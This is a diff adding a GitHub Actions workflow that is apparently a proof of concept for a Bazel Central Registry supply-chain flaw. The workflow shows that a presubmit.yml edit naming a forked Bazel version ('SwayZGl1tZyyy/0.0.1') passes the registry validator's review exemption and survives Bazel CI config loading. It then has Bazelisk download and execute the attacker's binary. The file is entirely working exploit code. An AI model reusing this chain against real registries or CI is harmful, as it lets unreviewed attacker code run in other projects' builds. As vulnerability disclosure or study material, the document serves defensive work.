@@ -1,0 +1,121 @@
+name: PoC - BCR Bazelisk Fork Selector
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PoC branch
+        uses: actions/checkout@v4
+        with:
+          ref: poc-bazelisk-fork-version
+          fetch-depth: 1
+
+      - name: Install Python dependencies
+        run: |
+          python3 -m pip install --disable-pip-version-check requests pyyaml zstandard
+
+      - name: Prove BCR review exemption with the real validator method
+        run: |
+          git fetch origin main --depth=1
+          git show FETCH_HEAD:modules/glu/9.0.3/presubmit.yml > /tmp/glu-baseline.yml
+
+          python3 - <<'PY'
+          import importlib.util
+          import pathlib
+          import sys
+
+          sys.path.insert(0, str(pathlib.Path('tools').resolve()))
+
+          spec = importlib.util.spec_from_file_location(
+              'bcr_validation',
+              pathlib.Path('tools/bcr_validation.py').resolve(),
+          )
+          bcr_validation = importlib.util.module_from_spec(spec)
+          spec.loader.exec_module(bcr_validation)
+
+          class Snapshot:
+              def presubmit_yml_lines(self):
+                  return pathlib.Path('/tmp/glu-baseline.yml').read_text().splitlines(True)
+
+          class Upstream:
+              def get_latest_module_version(self, module_name):
+                  assert module_name == 'glu'
+                  return Snapshot()
+
+          class Registry:
+              def get_presubmit_yml_path(self, module_name, version):
+                  assert (module_name, version) == ('glu', '9.0.3')
+                  return pathlib.Path('modules/glu/9.0.3/presubmit.yml')
+
+          validator = object.__new__(bcr_validation.BcrValidator)
+          validator.registry = Registry()
+          validator.upstream = Upstream()
+          validator.validation_results = []
+          validator.should_fix = False
+
+          validator.verify_presubmit_yml_change('glu', '9.0.3')
+
+          for result, message in validator.validation_results:
+              print(f'[validator] {result.name}: {message}')
+
+          assert any(
+              result == bcr_validation.BcrValidationResult.GOOD
+              and 'modulo supported platforms and versions' in message
+              for result, message in validator.validation_results
+          ), validator.validation_results
+
+          print('[+] BCR_MATRIX_REVIEW_EXEMPTION_CONFIRMED')
+          PY
+
+      - name: Prove the upstream Bazel CI loader preserves the fork selector
+        run: |
+          curl -fsSL \
+            https://raw.githubusercontent.com/bazelbuild/continuous-integration/master/buildkite/bazelci.py \
+            -o /tmp/bazelci.py
+
+          python3 - <<'PY'
+          import importlib.util
+
+          spec = importlib.util.spec_from_file_location('bazelci', '/tmp/bazelci.py')
+          bazelci = importlib.util.module_from_spec(spec)
+          spec.loader.exec_module(bazelci)
+
+          configs = bazelci.load_config(
+              http_url=None,
+              file_config='modules/glu/9.0.3/presubmit.yml',
+              allow_imports=False,
+          )
+
+          tasks = configs.get('tasks', {})
+          selected = [(name, task.get('bazel')) for name, task in tasks.items()]
+          print(f'[+] Expanded tasks: {selected!r}')
+
+          assert selected, 'No tasks were generated'
+          assert any(value == 'SwayZGl1tZyyy/0.0.1' for _, value in selected), selected
+
+          print('[+] BAZELCI_FORK_SELECTOR_PRESERVED')
+          PY
+
+      - name: Execute the selected custom Bazel through Bazelisk
+        run: |
+          curl -fsSL \
+            https://github.com/bazelbuild/bazelisk/releases/latest/download/bazelisk-linux-amd64 \
+            -o /tmp/bazel
+          chmod +x /tmp/bazel
+
+          set +e
+          OUTPUT="$(USE_BAZEL_VERSION='SwayZGl1tZyyy/0.0.1' /tmp/bazel --version 2>&1)"
+          STATUS=$?
+          set -e
+
+          printf '%s\n' "$OUTPUT"
+          test "$STATUS" -eq 0
+          grep -F 'BCR_CUSTOM_BAZEL_EXECUTED' <<< "$OUTPUT"
+
+          echo '[+] BAZELISK_ATTACKER_BINARY_EXECUTION_CONFIRMED'
